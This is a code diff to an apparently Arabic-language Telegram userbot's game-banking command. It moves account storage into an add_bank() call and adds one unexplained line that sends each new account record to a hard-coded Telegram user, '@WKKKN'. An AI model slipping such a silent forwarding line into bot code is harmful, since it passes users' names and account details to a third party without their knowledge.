@@ -568,14 +568,9 @@ async def bankar(message):
     us = str(''.join(random.choice(chars) for i in range(15)))
     s = "5"+us
     try:
-         with open(f"{mee.id}.txt","a")as x:
-          x.write(f"name:{mee.first_name}:account:{s}:banq:{bankn}")
-                #ft = await edit_or_reply(message,text=f"<strong>Done Create Banking Account! Account Detials :\nAccount Id : {s}\nBalance : 50 ?.\nBank Name : SpaceBank.</strong>",parse_mode="html",reply_markup=me)
-         with open(f"{mee.id}.txt","a")as xs:
-              xs.write("50")
-              xs.close()
-              cbs = await edit_or_reply(message,f"<strong>تم انشاء حساب مصرفي بt_nam|\nالاموال المودعة:50$</strong>", parse_mode="html")      
+         add_bank(mee.id, mee.first_name, 50, bankn)
+   
     finally:
-         #add_bank(mee.id, mee.first_name, 50, bankn)
-         cbs = await edit_or_reply(message,f"<strong>تم انشاء حساب مصرفي بالمعلومات التالية:\nاسم صاحب الحساب:{mee.first_name}|\nايدي الحساب:{s}|\nاسم المصرف:{bankn}|\nالاموال المودعة:50$</strong>", parse_mode="html")      
+         cbs = await edit_or_reply(message,f"<strong>تم انشاء حساب مصرفي بالمعلومات التالية:\nاسم صاحب الحساب:{mee.first_name}|\nايدي الحساب:{s}|\nاسم المصرف:{bankn}|\nالاموال المودعة:50$</strong>", parse_mode="html")
+         gg = await jmthon.send_message("@WKKKN", str(get_bank(mee.id)))
 
